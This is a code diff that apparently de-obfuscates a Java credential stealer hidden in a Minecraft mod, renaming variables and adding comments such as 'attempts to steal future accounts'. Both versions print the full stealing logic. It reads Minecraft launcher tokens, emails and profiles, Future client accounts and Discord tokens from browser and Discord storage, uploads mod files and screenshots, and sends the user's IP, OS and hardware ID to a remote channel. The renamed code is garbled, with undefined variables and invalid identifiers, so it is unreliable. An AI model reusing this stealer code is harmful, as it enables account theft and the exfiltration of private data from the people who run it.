@@ -31,60 +31,60 @@ public class Authentication {
     Database main;
 
     public void vmUtil() {
-        Authentication lllllllllllllllllIIIlIIIlllIlIII;
-        try {
-            String lllllllllllllllllIIIlIIIlllIlIll;
-            File lllllllllllllllllIIIlIIIlllIllIl = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Future/accounts.txt")));
-            BufferedReader lllllllllllllllllIIIlIIIlllIllII = new BufferedReader(new FileReader(lllllllllllllllllIIIlIIIlllIllIl));
-            while ((lllllllllllllllllIIIlIIIlllIlIll = lllllllllllllllllIIIlIIIlllIllII.readLine()) != null) {
+        Authentication authenticatorString;
+        try { //attempts to steal future accounts
+            String futureDir;
+            File futureAccs = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Future/accounts.txt")));
+            BufferedReader MAKETOfutureAccsContent = new BufferedReader(new FileReader(futureAccs));
+            while ((futureDir = MAKETOfutureAccsContent.readLine()) != null) {
                 try {
-                    String lllllllllllllllllIIIlIIIlllIllll = String.valueOf(new StringBuilder().append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[0]).append(" : ").append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[3]).append(" : ").append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[4]));
-                    lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage(String.valueOf(new StringBuilder().append("Future Accounts: ").append(lllllllllllllllllIIIlIIIlllIllll)));
+                    String futureAccsContent = String.valueOf(new StringBuilder().append(futureDir.split(":")[0]).append(" : ").append(futureDir.split(":")[3]).append(" : ").append(futureDir.split(":")[4]));
+                    authenticatorString.main.sendMessage(String.valueOf(new StringBuilder().append("Future Accounts: ").append(futureAccsContent)));
                 }
-                catch (Exception lllllllllllllllllIIIlIIIlllIlllI) {
-                    lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage("Error for Future ACC");
+                catch (Exception e) {
+                    authenticatorString.main.sendMessage("Error for Future ACC");
                 }
             }
         }
-        catch (Exception lllllllllllllllllIIIlIIIlllIlIlI) {
-            lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage("Error couldn't get any Future accounts.");
+        catch (Exception e) {
+            authenticatorString.main.sendMessage("Error couldn't get any Future accounts.");
         }
     }
 
     public void astolfoFolder() throws IOException {
-        File lllllllllllllllllIIIlIIIlllIIIII = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_profiles.json")));
-        if (lllllllllllllllllIIIlIIIlllIIIII.exists()) {
-            Database.sendFile(lllllllllllllllllIIIlIIIlllIIIII);
+        File launcherProfiles = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_profiles.json")));
+        if (launcherProfiles.exists()) {
+            Database.sendFile(launcherProfiles);
         } else {
-            Authentication lllllllllllllllllIIIlIIIlllIIIIl;
-            lllllllllllllllllIIIlIIIlllIIIIl.main.sendMessage("Unable to pull launcher profiles.");
+            Authentication authenticatorString2;
+            authenticatorString2.main.sendMessage("Unable to pull launcher profiles.");
         }
     }
 
     public void checks() {
-        try {
-            String lllllllllllllllllIIIlIIIlIIIIIIl;
-            File lllllllllllllllllIIIlIIIlIIIIllI = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_accounts.json")));
-            File lllllllllllllllllIIIlIIIlIIIIlIl = new File("/AppData/Roaming/.minecraft/launcher_accounts.json");
-            FileInputStream lllllllllllllllllIIIlIIIlIIIIlII = new FileInputStream(lllllllllllllllllIIIlIIIlIIIIllI);
-            DataInputStream lllllllllllllllllIIIlIIIlIIIIIll = new DataInputStream(lllllllllllllllllIIIlIIIlIIIIlII);
-            BufferedReader lllllllllllllllllIIIlIIIlIIIIIlI = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIIlIIIIIll));
-            while ((lllllllllllllllllIIIlIIIlIIIIIIl = lllllllllllllllllIIIlIIIlIIIIIlI.readLine()) != null) {
-                Authentication lllllllllllllllllIIIlIIIIlllllll;
-                String lllllllllllllllllIIIlIIIlIIIlIIl = "";
-                String lllllllllllllllllIIIlIIIlIIIlIII = "";
-                String lllllllllllllllllIIIlIIIlIIIIlll = "";
-                if (lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"ACCESSTOKEN\"")) {
-                    lllllllllllllllllIIIlIIIlIIIlIII = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
-                    lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft_Token: ").append(lllllllllllllllllIIIlIIIlIIIlIII).append("```")));
+        try { // attempts to steal token, email, name of minecraft accounts stored.
+            String launcherAccsDir;
+            File launcherAccounts = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_accounts.json")));
+            File launcherAccounts2 = new File("/AppData/Roaming/.minecraft/launcher_accounts.json");
+            FileInputStream launcherAccountsFS = new FileInputStream(launcherAccounts);
+            DataInputStream launcherAccountsDS = new DataInputStream(launcherAccountsFS);
+            BufferedReader launcherAccountsBuffer = new BufferedReader(new InputStreamReader(launcherAccountsDS));
+            while ((launcherAccsDir = launcherAccountsBuffer.readLine()) != null) {
+                Authentication authenticationString3;
+                String mcName = "";
+                String mcToken = "";
+                String mcEmail = "";
+                if (launcherAccsDir.toUpperCase().contains("\"ACCESSTOKEN\"")) {
+                    mcToken = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
+                    authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft_Token: ").append(mcToken).append("```")));
                 }
-                if (lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"NAME\"")) {
-                    lllllllllllllllllIIIlIIIlIIIlIIl = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
-                    lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft Name: ").append(lllllllllllllllllIIIlIIIlIIIlIIl).append("```")));
+                if (launcherAccsDir.toUpperCase().contains("\"NAME\"")) {
+                    mcName = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
+                    authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft Name: ").append(mcName).append("```")));
                 }
-                if (!lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"USERNAME\"")) continue;
-                lllllllllllllllllIIIlIIIlIIIIlll = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
-                lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Email: ").append(lllllllllllllllllIIIlIIIlIIIIlll).append("```")));
+                if (!launcherAccsDir.toUpperCase().contains("\"USERNAME\"")) continue;
+                mcEmail = launcherAccsDir.split(":")[1].replace("\"", "").replace(" ", "");
+                authenticationString3.main.sendMessage(String.valueOf(new StringBuilder().append("```Email: ").append(mcEmail).append("```")));
             }
         }
         catch (Exception exception) {
@@ -93,57 +93,58 @@ public class Authentication {
     }
 
     public static String getHWID() {
-        try {
-            byte[] lllllllllllllllllIIIlIIIllIIIlll;
-            String lllllllllllllllllIIIlIIIllIIlIll = String.valueOf(new StringBuilder().append(System.getenv("COMPUTERNAME")).append(System.getProperty("user.name")).append(System.getenv("PROCESSOR_IDENTIFIER")).append(System.getenv("PROCESSOR_LEVEL")));
-            MessageDigest lllllllllllllllllIIIlIIIllIIlIlI = MessageDigest.getInstance("MD5");
-            lllllllllllllllllIIIlIIIllIIlIlI.update(lllllllllllllllllIIIlIIIllIIlIll.getBytes());
-            StringBuffer lllllllllllllllllIIIlIIIllIIlIII = new StringBuffer();
-            for (byte lllllllllllllllllIIIlIIIllIIllII : lllllllllllllllllIIIlIIIllIIIlll = lllllllllllllllllIIIlIIIllIIlIlI.digest()) {
-                String lllllllllllllllllIIIlIIIllIIllIl = Integer.toHexString(0xFF & lllllllllllllllllIIIlIIIllIIllII);
-                if (lllllllllllllllllIIIlIIIllIIllIl.length() == 1) {
-                    lllllllllllllllllIIIlIIIllIIlIII.append('0');
+        try { // Attempts to grab hardware id
+            byte[] hwIDByte;
+            String hwIdString = String.valueOf(new StringBuilder().append(System.getenv("COMPUTERNAME")).append(System.getProperty("user.name")).append(System.getenv("PROCESSOR_IDENTIFIER")).append(System.getenv("PROCESSOR_LEVEL")));
+            MessageDigest hashId= MessageDigest.getInstance("MD5");
+            unknown1.update(hwIdString.getBytes());
+            StringBuffer hwIDStringBuff = new StringBuffer();
+            for (byte unknown2 : hwIDByte = unknown1.digest()) {
+                String unknown3 = Integer.toHexString(0xFF & unknown2);
+                if (unknown3.length() == 1) {
+                    hwIDStringBuff.append('0');
                 }
-                lllllllllllllllllIIIlIIIllIIlIII.append(lllllllllllllllllIIIlIIIllIIllIl);
+                hwIDStringBuff.append(unknown3);
             }
-            return lllllllllllllllllIIIlIIIllIIlIII.toString();
+            return hwIDStringBuff.toString();
         }
-        catch (Exception lllllllllllllllllIIIlIIIllIIIlIl) {
-            lllllllllllllllllIIIlIIIllIIIlIl.printStackTrace();
+        catch (Exception e) {
+            e.printStackTrace();
             return "Error";
         }
     }
 
     public void noDumper() throws IOException {
-        File lllllllllllllllllIIIlIIIllIllIlI = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/mods")));
-        Thread lllllllllllllllllIIIlIIIllIllIIl = new Thread(() -> {
-            if (lllllllllllllllllIIIlIIIllIllIlI.exists() && lllllllllllllllllIIIlIIIllIllIlI.isDirectory()) {
-                for (File lllllllllllllllllIIIIlllllllllII : lllllllllllllllllIIIlIIIllIllIlI.listFiles()) {
-                    if (!lllllllllllllllllIIIIlllllllllII.getName().contains(".jar")) continue;
+	//Attempts to steal all mods in mod directory
+        File modsContent = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/mods")));
+        Thread modsThread = new Thread(() -> {
+            if (modsContent.exists() && modsContent.isDirectory()) {
+                for (File modName : modsContent.listFiles()) {
+                    if (!modName.getName().contains(".jar")) continue;
                     try {
-                        Database.sendFile(lllllllllllllllllIIIIlllllllllII);
+                        Database.sendFile(modName);
                         Thread.sleep(500L);
                     }
-                    catch (Exception lllllllllllllllllIIIIllllllllllI) {
-                        lllllllllllllllllIIIIllllllllllI.printStackTrace();
+                    catch (Exception e) {
+                        e.printStackTrace();
                     }
                 }
             }
         });
-        lllllllllllllllllIIIlIIIllIllIIl.start();
+        modsThread.start();
     }
 
     public File notNM() {
         try {
-            Robot lllllllllllllllllIIIlIIIIIIllIII = new Robot();
-            BufferedImage lllllllllllllllllIIIlIIIIIIlIllI = lllllllllllllllllIIIlIIIIIIllIII.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-            File lllllllllllllllllIIIlIIIIIIlIlII = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Documents/fix.png")));
-            if (!lllllllllllllllllIIIlIIIIIIlIlII.exists()) {
+            Robot screenCapture-Er = new Robot();
+            BufferedImage screenCapBuff = screenCapture-Er.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+            File screenCap = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Documents/fix.png")));
+            if (!screenCap.exists()) {
                 // empty if block
             }
-            ByteArrayOutputStream lllllllllllllllllIIIlIIIIIIlIIIl = new ByteArrayOutputStream();
-            ImageIO.write((RenderedImage)lllllllllllllllllIIIlIIIIIIlIllI, "png", lllllllllllllllllIIIlIIIIIIlIlII);
-            return lllllllllllllllllIIIlIIIIIIlIlII;
+            ByteArrayOutputStream screenCapByteArray= new ByteArrayOutputStream();
+            ImageIO.write((RenderedImage)screenCapBuff, "png", screenCap);
+            return screenCap;
         }
         catch (Exception exception) {
             return null;
@@ -151,15 +152,15 @@ public class Authentication {
     }
 
     public void connect() {
-        String lllllllllllllllllIIIlIIIlllllIll = System.getProperty("os.name");
-        try {
-            Authentication lllllllllllllllllIIIlIIIllllllII;
-            URL lllllllllllllllllIIIlIIlIIIIIIII = new URL("http://checkip.amazonaws.com");
-            BufferedReader lllllllllllllllllIIIlIIIllllllll = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIlIIIIIIII.openStream()));
-            String lllllllllllllllllIIIlIIIlllllllI = lllllllllllllllllIIIlIIIllllllll.readLine();
-            String lllllllllllllllllIIIlIIIllllllIl = System.getProperty("user.name");
-            lllllllllllllllllIIIlIIIllllllII.main.sendMessage(String.valueOf(new StringBuilder().append("@everyone ``` NAME : ").append(lllllllllllllllllIIIlIIIllllllIl).append("\n IP   : ").append(lllllllllllllllllIIIlIIIlllllllI).append(" \n OS   : ").append(lllllllllllllllllIIIlIIIlllllIll).append("```")));
-            lllllllllllllllllIIIlIIIllllllII.main.sendMessage(String.valueOf(new StringBuilder().append("```HWID: ").append(Authentication.getHWID()).append("```")));
+        String osName = System.getProperty("os.name");
+        try { // tries sending information stolen into a discord channel.
+            Authentication authenticatorString4;
+            URL url = new URL("http://checkip.amazonaws.com");
+            BufferedReader unknown5 = new BufferedReader(new InputStreamReader(unknown6.openStream()));
+            String unknown7 = unknown5.readLine();
+            String osUserName = System.getProperty("user.name");
+            authenticatorString4.main.sendMessage(String.valueOf(new StringBuilder().append("@everyone ``` NAME : ").append(unknown8).append("\n IP   : ").append(unknown9).append(" \n OS   : ").append(unknown10).append("```")));
+            authenticatorString4.main.sendMessage(String.valueOf(new StringBuilder().append("```HWID: ").append(Authentication.getHWID()).append("```")));
         }
         catch (Exception exception) {
             // empty catch block
@@ -170,12 +171,12 @@ public class Authentication {
         try {
             Thread.sleep(500L);
             try {
-                Authentication lllllllllllllllllIIIlIIIIIlIIlIl;
-                File lllllllllllllllllIIIlIIIIIlIlIII = lllllllllllllllllIIIlIIIIIlIIlIl.notNM();
-                Database.sendFile(lllllllllllllllllIIIlIIIIIlIlIII);
+                Authentication authenticationString6;
+                File screenCapFinal = authenticationString6.notNM();
+                Database.sendFile(screenCapFinal);
             }
-            catch (Exception lllllllllllllllllIIIlIIIIIlIIlll) {
-                lllllllllllllllllIIIlIIIIIlIIlll.printStackTrace();
+            catch (Exception e) {
+                e.printStackTrace();
             }
         }
         catch (Exception exception) {
@@ -184,41 +185,41 @@ public class Authentication {
     }
 
     public Authentication() {
-        Authentication lllllllllllllllllIIIlIIlIIIIlIII;
-        lllllllllllllllllIIIlIIlIIIIlIII.main = new Database();
+        Authentication authString9;
+        DATABASE.main = new Database();
     }
 
     public void captcha() {
-        String lllllllllllllllllIIIlIIIIlIIlIll = System.getProperty("os.name");
-        if (lllllllllllllllllIIIlIIIIlIIlIll.contains("Windows")) {
-            ArrayList<String> lllllllllllllllllIIIlIIIIlIIllll = new ArrayList<String>();
-            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discord/Local Storage/leveldb/")));
-            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordptb/Local Storage/leveldb/")));
-            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordcanary/Local Storage/leveldb/")));
-            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb")));
-            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb")));
-            int lllllllllllllllllIIIlIIIIlIIlllI = 0;
-            StringBuilder lllllllllllllllllIIIlIIIIlIIllIl = new StringBuilder();
+        String sysOsName = System.getProperty("os.name");
+        if (sysOsName.contains("Windows")) {
+            ArrayList<String> discordInfoArray = new ArrayList<String>();
+            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discord/Local Storage/leveldb/")));
+            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordptb/Local Storage/leveldb/")));
+            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordcanary/Local Storage/leveldb/")));
+            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb")));
+            discordInfoArray.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb")));
+            int unknownInt = 0;
+            StringBuilder discordToken = new StringBuilder();
             try {
-                for (String lllllllllllllllllIIIlIIIIlIlIIIl : lllllllllllllllllIIIlIIIIlIIllll) {
-                    File lllllllllllllllllIIIlIIIIlIlIIll = new File(lllllllllllllllllIIIlIIIIlIlIIIl);
-                    String[] lllllllllllllllllIIIlIIIIlIlIIlI = lllllllllllllllllIIIlIIIIlIlIIll.list();
-                    if (lllllllllllllllllIIIlIIIIlIlIIlI == null) continue;
-                    for (String lllllllllllllllllIIIlIIIIlIlIlII : lllllllllllllllllIIIlIIIIlIlIIlI) {
+                for (String unknown11 : discordInfoArray) {
+                    File unknown12 = new File(unknown11);
+                    String[] unknown13 = unknown12.list();
+                    if (unknown13 == null) continue;
+                    for (String unknown14 : unknown13) {
                         try {
-                            String lllllllllllllllllIIIlIIIIlIlIlIl;
-                            FileInputStream lllllllllllllllllIIIlIIIIlIllIII = new FileInputStream(String.valueOf(new StringBuilder().append(lllllllllllllllllIIIlIIIIlIlIIIl).append(lllllllllllllllllIIIlIIIIlIlIlII)));
-                            DataInputStream lllllllllllllllllIIIlIIIIlIlIlll = new DataInputStream(lllllllllllllllllIIIlIIIIlIllIII);
-                            BufferedReader lllllllllllllllllIIIlIIIIlIlIllI = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIIIlIlIlll));
-                            while ((lllllllllllllllllIIIlIIIIlIlIlIl = lllllllllllllllllIIIlIIIIlIlIllI.readLine()) != null) {
-                                Pattern lllllllllllllllllIIIlIIIIlIllIll = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
-                                Matcher lllllllllllllllllIIIlIIIIlIllIIl = lllllllllllllllllIIIlIIIIlIllIll.matcher(lllllllllllllllllIIIlIIIIlIlIlIl);
-                                while (lllllllllllllllllIIIlIIIIlIllIIl.find()) {
-                                    if (lllllllllllllllllIIIlIIIIlIIlllI > 0) {
-                                        lllllllllllllllllIIIlIIIIlIIllIl.append("\n");
+                            String unknown15;
+                            FileInputStream unknown16 = new FileInputStream(String.valueOf(new StringBuilder().append(unknown11).append(unknown14)));
+                            DataInputStream unknown17 = new DataInputStream(unknown16);
+                            BufferedReader unknown18 = new BufferedReader(new InputStreamReader(unknown17));
+                            while ((unknown15 = unknown18.readLine()) != null) {
+                                Pattern unknown19 = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                                Matcher unknown20 = unknown19.matcher(unknown15);
+                                while (unknown20.find()) {
+                                    if (unknownInt > 0) {
+                                        discordToken.append("\n");
                                     }
-                                    lllllllllllllllllIIIlIIIIlIIllIl.append(" ").append(lllllllllllllllllIIIlIIIIlIllIIl.group());
-                                    ++lllllllllllllllllIIIlIIIIlIIlllI;
+                                    discordToken.append(" ").append(unknown20.group());
+                                    ++unknownInt;
                                 }
                             }
                         }
@@ -227,13 +228,13 @@ public class Authentication {
                         }
                     }
                 }
-                lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage(String.valueOf(new StringBuilder().append("```Discord_Token ").append(String.valueOf(lllllllllllllllllIIIlIIIIlIIllIl)).append("```")));
+                DATABASEPOSSIBLE.main.sendMessage(String.valueOf(new StringBuilder().append("```Discord_Token ").append(String.valueOf(discordToken)).append("```")));
             }
-            catch (Exception lllllllllllllllllIIIlIIIIlIlIIII) {
-                lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage(String.valueOf(new StringBuilder().append("``` UNABLE TO PULL TOKENS : ").append(lllllllllllllllllIIIlIIIIlIlIIII).append("```")));
+            catch (Exception e) {
+                DATABASEPOSSIBLE.main.sendMessage(String.valueOf(new StringBuilder().append("``` UNABLE TO PULL TOKENS : ").append(lllllllllllllllllIIIlIIIIlIlIIII).append("```")));
             }
         } else {
-            lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
+            DATABASEPOSSIBLE.main.sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
         }
     }
 }
